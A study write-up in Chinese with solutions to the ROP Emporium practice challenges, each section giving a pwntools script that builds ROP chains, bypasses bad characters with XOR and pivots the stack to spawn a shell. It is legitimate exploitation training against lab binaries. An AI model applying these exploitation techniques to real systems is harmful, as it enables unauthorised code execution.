# ROP Emporium - Notes
> 一個練習 ROP 的網站，題目可以去官方抓
> [官方](https://ropemporium.com/)

## ret2win32

保護只有開 DEP ，看 Code 很明顯有 stack overflow 洞在

然後只要跳到 ret2win() 這個函數即可

```
$ python -c 'from pwn import * ; print "a"*44 + p32(0x08048659)' | ./ret2win32
```

## ret2win

同上題，只是改成x64
```
$ python -c 'from pwn import * ; print "a"*40 + p64(0x400811)' | ./ret2win
```

## split32

一樣只有開 DEP 保護，然後這題有提供一個函數使用

```
int usefulFunction()
{
  return system("/bin/ls");
}
```

和一個可用的字串
```
.data:0804A030                 public usefulString
.data:0804A030 usefulString    db '/bin/cat flag.txt',0
```

所以我們可以寫 payload

```python
#!/usr/bin/env python
from pwn import *
context.arch = 'i386'

r = process('/tmp/p/split32')

trash = 'a'*44
system_plt = 0x8048430

r.sendline(trash + flat([system_plt, 0, 0x804A030]))


r.interactive()
```


## split

改成 x64 嘗試

```
#!/usr/bin/env python
from pwn import *
context.arch = 'amd64'
r = process('/tmp/p/split')

system_plt = 0x4005e0
trash = 'a'*40
useful_str = 0x601060
pop_rdi_ret = 0x0000000000400883
r.sendline(trash + flat([pop_rdi_ret, useful_str, system_plt]))

r.interactive()
```

## callme32

這題一樣只開 DEP ，不過用 checksec 會看到有一個 RPATH ，它是用來指定要從哪個路徑 Load Library

在 gcc 時，可以下 ```-rpath <PATH>```

然後先看一下程式，裡面有三個函數: callme_one(), callme_two(), callme_three()

那我們用 ida pro 去看 libcallme32.so ，可以知道這三個函數都要給值1,2,3

也就是分別執行: callme_one(1,2,3)、callme_two(1,2,3)、callme_three(1,2,3) 即可

```python
#!/usr/bin/env python
from pwn import *
context.arch = 'i386'
r = process('./callme32')

trash = 'a'*44
one_plt = 0x80485c0 
two_plt = 0x8048620
three_plt = 0x80485b0
pop3_ret = 0x080488a9
payload = trash + flat([one_plt, pop3_ret, 1, 2, 3, two_plt, pop3_ret, 1, 2, 3, three_plt,0,1,2,3])

r.sendline(payload)

r.interactive()
```

## callme

同上，只是改成 x64

```
#!/usr/bin/env python
from pwn import *
context.arch = 'amd64'

r = process('./callme')

trash = 'a'*40
one = 0x401850
two = 0x401870
three = 0x401810

pop_rdi_ret = 0x0000000000401b23
pop_rsi_rdx_ret = 0x0000000000401ab1 

pay = flat([pop_rdi_ret, 1, pop_rsi_rdx_ret, 2, 3, one])
pay+= flat([pop_rdi_ret, 1, pop_rsi_rdx_ret, 2, 3, two])
pay+= flat([pop_rdi_ret, 1, pop_rsi_rdx_ret, 2, 3, three])

r.sendline(trash + pay)

r.interactive()
```


## write432

這題跟 split 的差別在裡面沒有可用字串，需要自己塞



```python
#!/usr/bin/env python
from pwn import *
context.arch = 'i386'
r = process('/tmp/p/write432')

mov_dedi_ebp = 0x08048670
pop_edi_ebp_ret = 0x080486da
bss = 0x804b000 - 0x100
system_plt = 0x8048430

trash = 'a'*44

payload = flat([pop_edi_ebp_ret, bss, '/bin', mov_dedi_ebp])
payload+= flat([pop_edi_ebp_ret, bss+4, '/sh\x00', mov_dedi_ebp])
payload+= flat([system_plt, bss, bss])

r.sendline(trash + payload)


r.interactive()
```


## write4 

改為 64-bit

```python
#!/usr/bin/env python
from pwn import *
context.arch = 'amd64'
r = process('/tmp/p/write4')

trash = 'a'*40

system_plt = 0x4005e0

mov_dr14_r15_ret = 0x0000000000400820
pop_r14_r15_ret = 0x0000000000400890
pop_rdi_ret = 0x0000000000400893
bss = 0x00602000 - 0x100

payload = flat([pop_r14_r15_ret, bss, '/bin/sh\x00', mov_dr14_r15_ret])
payload+= flat([pop_rdi_ret, bss, system_plt])

r.sendline(trash + payload)
r.interactive()
```

## badchars32

這題和上一題一樣，只是他有對輸入做檢查，

'b','i','c','/',' ','f','n','s'

禁止上面這八個，所以要對輸入做編碼，執行前解碼

這裡用 xor 做編碼和解碼

```python
#!/usr/bin/env python
from pwn import *
context.arch = 'i386'
r = process('/tmp/p/badchars32')
trash = 'a'*44
bss = 0x0804b000 - 0x100

xor_debx_cl = 0x08048890
system_plt = 0x80484e0
mov_dedi_esi = 0x08048893
pop_esi_edi = 0x08048899
pop_ebx_ecx = 0x08048896
bad = [0x62, 0x69, 0x63, 0x2F, 0x20, 0x66, 0x6E, 0x73]

xor_bit = 0x2

sh_encode = xor('/bin/sh\x00', xor_bit)

payload = flat([pop_esi_edi, sh_encode[:4], bss, mov_dedi_esi  ])
payload+= flat([pop_esi_edi, sh_encode[4:8], bss+4, mov_dedi_esi  ])

for i in range(8):
	payload += flat([ pop_ebx_ecx, bss+i, xor_bit, xor_debx_cl ])

payload += flat([ system_plt, bss, bss ])

r.sendline(trash + payload)
r.interactive()
```


## badchars

改為 64-bit

```python 
#!/usr/bin/env python 
from pwn import *
context.arch = 'amd64'
r = process('/tmp/p/badchars')

bad = [0x62, 0x69, 0x63, 0x2F, 0x20, 0x66, 0x6E, 0x73]
xor_bit = 0x2
sh_encode = xor('/bin/sh\x00', xor_bit)
trash = 'a'*40
bss = 0x00602000 - 0x100
system_plt = 0x4006f0
xor_r15_r14b = 0x0000000000400b30
mov_dr13_r12 = 0x0000000000400b34
pop_r12_r13 = 0x0000000000400b3b
pop_r14_r15_ret = 0x0000000000400b40
pop_rdi_ret = 0x0000000000400b39

payload = flat([ pop_r12_r13, sh_encode, bss, mov_dr13_r12 ])
for i in range(8):
	payload += flat([ pop_r14_r15_ret, xor_bit, bss+i, xor_r15_r14b ])
payload += flat([pop_rdi_ret, bss, system_plt])

r.sendline(trash + payload)
r.interactive()
```


## fluff32

這題主要差別在 gadget 給的不好找

題目裡面有特別給
```
08048670 <questionableGadgets>:
 8048670:       5f                      pop    edi
 8048671:       31 d2                   xor    edx,edx
 8048673:       5e                      pop    esi
 8048674:       bd be ba fe ca          mov    ebp,0xcafebabe
 8048679:       c3                      ret
 804867a:       5e                      pop    esi
 804867b:       31 da                   xor    edx,ebx
 804867d:       5d                      pop    ebp
 804867e:       bf be ba ad de          mov    edi,0xdeadbabe
 8048683:       c3                      ret
 8048684:       bf ef be ad de          mov    edi,0xdeadbeef
 8048689:       87 ca                   xchg   edx,ecx
 804868b:       5d                      pop    ebp
 804868c:       ba d0 ce fa de          mov    edx,0xdefaced0
 8048691:       c3                      ret
 8048692:       5f                      pop    edi
 8048693:       89 11                   mov    DWORD PTR [ecx],edx
 8048695:       5d                      pop    ebp
 8048696:       5b                      pop    ebx
 8048697:       30 19                   xor    BYTE PTR [ecx],bl
 8048699:       c3                      ret
 804869a:       66 90                   xchg   ax,ax
 804869c:       66 90                   xchg   ax,ax
 804869e:       66 90                   xchg   ax,ax

```

最終 payload

```python
#!/usr/bin/env python
from pwn import *
context.arch = 'i386'
r = process('/tmp/p/fluff32')

trash = 'a'*44
system_plt = 0x8048430
bss = 0x0804b000-0x100
mov_decx_edx = 0x08048693
# mov dword ptr [ecx], edx ; pop ebp ; pop ebx ; xor byte ptr [ecx], bl ; ret
pop_ebx_ret = 0x080483e1
inc_ecx = 0x080488ba
xchg_edx_ecx = 0x08048689
# xchg edx, ecx ; pop ebp ; mov edx, 0xdefaced0 ; ret
xor_edx_ebx = 0x0804867b
# xor edx, ebx ; pop ebp ; mov edi, 0xdeadbabe ; ret
xor_edx_edx = 0x08048671
# xor edx, edx ; pop esi ; mov ebp, 0xcafebabe ; ret

# set ecx = bss
payload = flat([ pop_ebx_ret, bss])
payload+= flat([ xor_edx_edx, 0xdeadbeef, xor_edx_ebx, 0xdeadbeef, xchg_edx_ecx, 0xdeadbeef ])

# set edx = '/bin'
payload+= flat([ pop_ebx_ret, '/bin', xor_edx_edx, 0xdeadbeef, xor_edx_ebx, 0xdeadbeef])

# mov [ecx] , edx
payload+= flat([ mov_decx_edx, 0, 0 ])

# set ecx = bss + 4
payload+= p32(inc_ecx)*4

# set edx = '/sh\x00'
payload+= flat([ pop_ebx_ret, '/sh\x00', xor_edx_edx, 0xdeadbeef, xor_edx_ebx, 0xdeadbeef])

# mov [ecx] , edx
payload+= flat([ mov_decx_edx, 0, 0 ])


payload+= flat([ system_plt, bss, bss])

r.sendline(trash + payload)
r.interactive()
```

## fluff

一樣改為 x64，不過用 ROPgadget 找 gadget 要加 --depth 才可以找到比較長的 gadget

```$ ROPgadget --binary ./fluff --depth 30 > gad```

最終完整 payload

```python
#!/usr/bin/env python
from pwn import *
context.arch = 'amd64'
r = process('/tmp/p/fluff')

trash = 'a'*40
system_plt = 0x4005e0
bss = 0x00602000-0x100
pop_rdi_ret = 0x00000000004008c3
mov_dr10_r11 = 0x000000000040084e
# mov qword ptr [r10], r11 ; pop r13 ; pop r12 ; xor byte ptr [r10], r12b ; ret
xchg_r11_r10 = 0x000000000040083b
#  mov edi, 0x601050 ; xchg r11, r10 ; pop r15 ; mov r11d, 0x602050 ; ret
xor_r11_r11 = 0x0000000000400820
# pop r15 ; xor r11, r11 ; pop r14 ; mov edi, 0x601050 ; ret
xor_r11_r12 = 0x000000000040082d
# pop r14 ; xor r11, r12 ; pop r12 ; mov r13d, 0x604060 ; ret
pop_r12 = 0x0000000000400832

payload = flat([ pop_r12, bss, xor_r11_r11, 0, 0, xor_r11_r12, 0, 0 ])
payload+= flat([ xchg_r11_r10, 0,  ])
payload+= flat([ pop_r12, '/bin/sh\x00', xor_r11_r11, 0, 0, xor_r11_r12, 0, 0 ])
payload+= flat([ mov_dr10_r11, 0, 0, pop_rdi_ret, bss, system_plt ])

r.sendline(trash + payload)

r.interactive()
```

## pivot32

執行程式樣子
```
$ ./pivot32
pivot by ROP Emporium
32bits

Call ret2win() from libpivot.so
The Old Gods kindly bestow upon you a place to pivot: 0xf75e6f08
Send your second chain now and it will land there

```

所以我們需要先 decompiler libpivot.so 看看

然後要注意的是， libpivot.so 有開啟 PIE 

然後我們 overflow 那邊，只可以輸入 58 個字

44 - 48 蓋到 ret ，其餘只剩下十個字，長度並不夠，所以需要 stack pivot

然後利用 foothold_function() 來 leak 位址後去算 ret2win() 的位址


```python
#!/usr/bin/env python
from pwn import *
context.arch = 'i386'
r = process('/tmp/p/pivot32')

leave_ret = 0x080486a8
foothold_got = 0x804a024
foothold_plt = 0x80485f0

r.recvuntil('kindly bestow upon you a place to pivot: ')
heap_addr = int(r.recvuntil('\n')[:-1], 16)
print "heap addr: ", hex(heap_addr)

pop_eax = 0x080488c0
call_eax = 0x080486a3
pop_ebx = 0x08048571
mov_eax_deax = 0x080488c4
add_eax_ebx = 0x080488c7
ret2win_off = 0x967
foothold_off = 0x770
offset = ret2win_off - foothold_off

pay1 = flat([ foothold_plt, pop_eax, foothold_got, mov_eax_deax, pop_ebx, offset, add_eax_ebx, call_eax ])
r.sendlineafter('> ', pay1)

pay2 = ''.ljust(40, 'a') + flat([ heap_addr-4, leave_ret ])
r.sendlineafter('> ', pay2)

r.interactive()
```

## pivot

改為 64-bit

這裡有一個卡得比較久，就是 leave_ret 都有 0a 所以不能用，要用其他的

一開始沒注意這個...


```python
#!/usr/bin/env python
from pwn import *
context.arch = 'amd64'

r = process('/tmp/p/pivot')

r.recvuntil('Gods kindly bestow upon you a place to pivot: ')
heap_addr = int(r.recvuntil('\n')[:-1], 16)
print "heap addr: ",hex(heap_addr)

call_rax = 0x000000000040098e
leave_ret = 0x0000000000400a39 # mov ebp, esp ; pop ebp
foot_plt = 0x400850
foot_got = 0x0000000000602048
off = 0xabe - 0x970
pop_rax = 0x0000000000400b00
add_rax_rbp = 0x0000000000400b09
pop_rbp = 0x0000000000400900
xchg_rax_rsp = 0x0000000000400b02
mov_rax_drax = 0x0000000000400b05
pay1 = flat([ foot_plt, pop_rax, foot_got, mov_rax_drax ,pop_rbp, off, add_rax_rbp, call_rax ])
r.sendlineafter('> ', pay1)


pay2 = ''.ljust(40, 'a') + flat([pop_rax, heap_addr, xchg_rax_rsp]) 
r.sendlineafter('> ', pay2)
r.interactive()
```
